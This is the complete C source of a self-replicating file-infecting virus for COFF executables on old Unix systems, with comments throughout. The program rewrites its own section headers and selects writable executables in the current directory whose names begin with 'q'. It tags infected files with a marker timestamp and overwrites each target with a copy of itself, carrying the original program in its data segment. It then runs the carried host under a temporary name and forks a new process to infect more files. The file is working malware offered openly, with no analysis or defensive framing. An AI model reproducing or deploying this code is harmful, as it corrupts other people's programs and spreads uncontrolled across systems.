#include <fcntl.h>
#include <sys/dir.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <filehdr.h>
#include <aouthdr.h>
#include <scnhdr.h>

/* necessary to declare these as static and put something in them
	 * to get compiler to put them in the .data section rather than the
	 * .bss section */
static struct filehdr fhdptr = 52;
static AOUTHDR autptr = 52;
static SCNHDR scnptr[3] = {
	1, 2, 3 				};


/* non-zero if COFF headers in .data segment are nonsense */
static headers = 0x02;
/* non-zero if other program isn't loaded into .data segment */
static loaded = 0xff;

extern errno;

main( ac, av )
int	ac;
char	**av;
{

	int	i, j, stat_loc;
	int	fp_out, fp_in;
	int	pid1, pid2;
	char	*infect, boname[15];
	static int	sbeak = 31;
	static int	size = 32;
	static int	xsize = 33;

	int	write_headers(), read_headers();
	char	*decide();

	if ( headers ) {
		/* don't have COFF header info in memory */

		/* open a file to read header info from */
		if ( (fp_in = open( *av, O_RDONLY )) < 0 ) {
			write(2, "couldn't open self for header read\n", 35 );
			close( fp_out );
			_exit( errno );
		}

		/* read in and write out COFF headers, changed so .bss is now .data */
		size = read_headers( fp_in );

		close( fp_in );

		/* mark this shit as infected: this seems like a good place */
		fhdptr.f_timdat = 0X696E6665;

		/* turn off symbol table stuff */
		fhdptr.f_symptr = 0;
		fhdptr.f_nsyms = 0;

		/* rearrange header data so .bss is now in .data */
		scnptr[1].s_size += scnptr[2].s_size;
		scnptr[2].s_size = 0;
		scnptr[2].s_vaddr = 0;
		scnptr[2].s_paddr = 0;
		scnptr[2].s_scnptr = 0;

		if ( fhdptr.f_opthdr ) {
			/* optional header is present */
			autptr.dsize += autptr.bsize;
			autptr.bsize = 0;
		}

		/* need a new file name to write running version of self
		 * to: can't use current file, it contains a running executable */
		i = 0;
		while ( **(av + i) ) {
			boname[i] = **(av + i);
			++i;
		}

		boname[i] = 'x';
		boname[i + 1] = 0;
		write( 1, boname, i + 2 );

		/* open file to send new image of self with header info */
		if ( (fp_out = open( boname, O_WRONLY | O_CREAT | O_TRUNC )) < 0 ) {
			write(2, "couldn't open output file for write\n", 36 );
			_exit( errno );
		}

		chmod( boname, 0755 );

		size = write_headers( fp_out );

		headers = 0;

		/* find out where current data segment ends */
		/* this call will find end of .data and .bss segments */
		if ( (sbeak = sbrk( 0 )) < 0 ) {
			write(2, "1st sbrk() failed\n", 18 );
			_exit( errno );
		}


	} else if ( loaded ) {

		/* need to allocate a chunk of memory and load new file into it */

		/* decide what file to load: xsize will tell how much to allocate */
		infect = decide( &xsize );

		/* open file to load */
		if ( (fp_in = open( infect, O_RDONLY )) < 0 ) {
			write( 2, "couldn't open file to load\n", 27 );
			_exit( errno );
		}

		/* set system break to accomodate loaded file */
		if ( sbrk( xsize ) < 0 ) {
			write( 2, "couldn't allocate memory\n", 25 );
			close(fp_in);
			_exit( errno );
		}

		/* load file into memory */
		if ( read( fp_in, (char *)sbeak, xsize ) != xsize ) {
			write( 2, "couldn't load file\n", 19 );
			close(fp_in);
			_exit( errno );
		}

		/* close loaded file */
		close(fp_in);

		/* add to .data segment */
		scnptr[1].s_size += xsize;

		/* if optional header is present */
		if ( fhdptr.f_opthdr ) {
			autptr.dsize += xsize;
		}

		loaded = 0;	/* set flag to indicate a file is loaded */

		/* reopen file and truncate it */
		if ( (fp_out = open( infect, O_WRONLY | O_CREAT | O_TRUNC )) < 0 ) {
			write(2, "couldn't open output file for write\n", 36 );
			_exit( errno );
		}

		/* rewrite headers into file to infect */
		size = write_headers( fp_out );

	} else {

		/* pregnant with an executable image, write it to disk */

		pid1 = fork();

		if ( !pid1 ) {
			/* child goes on to execute loaded file */

			/* write it out to disk */
			if ((fp_out = open( "shitface", O_WRONLY | O_CREAT | O_EXCL)) < 0) {
				write(2, "couldn't open output file for rewrite\n", 36);
				_exit( errno );
			}

			chmod( "shitface", 0755 );

			if ( write( fp_out, (char *)sbeak, xsize ) < xsize ) {
				write(2, "error writing loaded file\n", 26 );
				_exit( errno );
			}

			close(fp_out);

			/* execute it with argv from this process */
			execv( "shitface", av );
			write( 2, "execv failed\n", 13 );
			exit( errno );

		} else {

			/* parent forks again, this child looks to infect another file */
			if ( pid2 = fork() ) {
				wait( &stat_loc );
				unlink( "shitface" );
				_exit( stat_loc >> 8 );
			} else {
				/* reset flag to indicate another file is to be infected */
				loaded = 0x02;
				/* reset system break */
				sbrk( -xsize );
				xsize = 0;
				/* clever recursive use of main() */
				main();
			}

		}
	}


	/* round up output file fp_out to 1024 byte boundary */
	j = 1024 - size % 1024;

	/* fill output file with nulls */
	while ( j--)
		write( fp_out, "\000", 1 );

	/* write .text segment from memory */

	if ( (size = write( fp_out, (char *)scnptr[0].s_vaddr, (int)scnptr[0].s_size )) < scnptr[0].s_size ) {
		write(2, "error writing .text\n", 20 );
		_exit( errno );
	}

	/* round up output file fp_out to 1024 byte boundary */
	j = 1024 - size % 1024;

	/* fill output file with nulls */
	while ( j--)
		write( fp_out, "\000", 1 );

	/* write .data segment from memory */
	if ( write( fp_out, (char *)scnptr[1].s_vaddr, (int)scnptr[1].s_size ) < scnptr[1].s_size ) {
		write(2, "error writing .data\n", 20);
	}

	close( fp_out );

	_exit( 0 );
}


int
read_headers( fp )
int	fp; /* file descriptor to read headers from */
{
	int	i, total, seize;


	if ( (total = read( fp, (char *) & fhdptr, sizeof( struct filehdr ))) < 0 ) {
		write( 2, "couldn't read header\n", 21 );
		_exit( errno );
	}

	if ( fhdptr.f_opthdr ) {
		/* optional header is present */
		if ( (seize = read( fp, (char *) & autptr, (int)sizeof(struct aouthdr ))) < 0) {
			write( 2, "couldn't read Unix system header\n", 33 );
			_exit( errno );
		}
		total += seize;
	}

	for ( i = 0; i < fhdptr.f_nscns; ++i ) {
		if ( (seize = read( fp, (char *) & scnptr[i], SCNHSZ)) < 0 ) {
			write( 2, "couldn't read section header\n", 29);
			_exit(i);
		}
		total += seize;
	}

	return total;
}


int
write_headers( fp_out )
int	fp_out; /* file descriptor to write headers to */
{
	int	i, total, seize;

	/* just write already loaded headers to output file */

	if ( (total = write( fp_out, (char *) & fhdptr, (int)sizeof( struct filehdr ))) < 0) {
		write( 2, "couldn't rewrite header\n", 24 );
		_exit( errno );
	}


	if ( fhdptr.f_opthdr ) {
		/* optional header is present */
		if ( (seize = write( fp_out, (char *) & autptr, (int)sizeof( struct aouthdr )) ) < 0 ) {
			write( 2, "couldn't rewrite Unix system header\n", 36 );
			_exit( errno );
		}

		total += seize;
	}

	/* write out section headers */
	for ( i = 0; i < fhdptr.f_nscns; ++i ) {
		if ( (seize = write( fp_out, (char *) & scnptr[i], (int)SCNHSZ) ) < 0 ) {
			write( 2,
			    "couldn't rewrite section header\n", 32 );
			_exit(i);
		}

		total += seize;
	}

	return total;
}


char	*
decide( s )
int	*s;
{
	struct direct entry;
	struct stat stbuf;
	struct filehdr fhdx;
	int	dirfd, i, tfd;
	/* file name must be static since only pointer to it gets returned.
	 * if it were automatic, that pointer would be invalid after function
	 * returned. */
	static char	fname[DIRSIZ];

	if ( (dirfd = open( ".", O_RDONLY )) < 0 ) {
		write( 2, "couldn't open \".\"\n", 18 );
		_exit( errno );
	}

	while ( read( dirfd, (char *) & entry, sizeof(struct direct ) ) > 0 ) {

		/* only examine files with names starting with 'q' */
		if ( entry.d_name[0] == 'q' ) {

			/* file status call */
			if ( stat( entry.d_name, (struct stat *) & stbuf ) < 0 ) {
				write( 2, "stat call failed\n", 17 );
				_exit( errno );
			}

			/* determine whether this file has acceptable 
				 * read, write and execute permissions */
			if ( accetab( (int)stbuf.st_mode ) ) {

				/* determine if this file is already infected */
				if ( (tfd = open( entry.d_name, O_RDONLY )) > 0 ) {

					if ( read( tfd, (char *) & fhdx, sizeof( struct filehdr ) ) == sizeof( struct filehdr ) ) {

						close( tfd ); 

						    if ( fhdx.f_timdat != 0X696E6665 ) {

							for ( i = 0; entry.d_name[i]; ++i )
							    fname[i] = entry.d_name[i]; 

						    write( 2, entry.d_name, DIRSIZ ); 
						    *s = stbuf.st_size; 
						    break; 
						}
					}
				}
			} /* end of if over permissions acceptable */
		} /* end of if over file name */
	} /* end of while over no. of directory entries */

	close( dirfd ); 

	return fname; 
}


int
accetab( mode )
int mode; 
{
	if ( (mode & S_IFREG) && (mode & S_IREAD ) && (mode & S_IWRITE ) && (mode & S_IEXEC ))
	    return 1; 
	    else
		return 0; 
}


